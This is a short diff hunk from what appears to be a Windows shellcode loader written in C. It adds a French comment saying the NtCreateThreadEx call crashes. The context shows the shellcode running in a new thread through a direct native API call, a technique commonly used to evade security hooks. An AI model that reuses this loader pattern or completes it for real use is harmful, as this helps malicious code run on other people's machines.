@@ -211,6 +211,7 @@ void main() {
 
     // Executing shellcode in a new thread
     // th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
+    // PROBLEME ICI CRASH, arguments issue maybe
     _NtCreateThreadEx(&th, GENERIC_ALL, NULL, (HANDLE)-1, exec, NULL, FALSE, (ULONG_PTR)NULL, (SIZE_T)NULL, (SIZE_T)NULL, NULL);
 
     // WaitForSingleObject(th, -1);
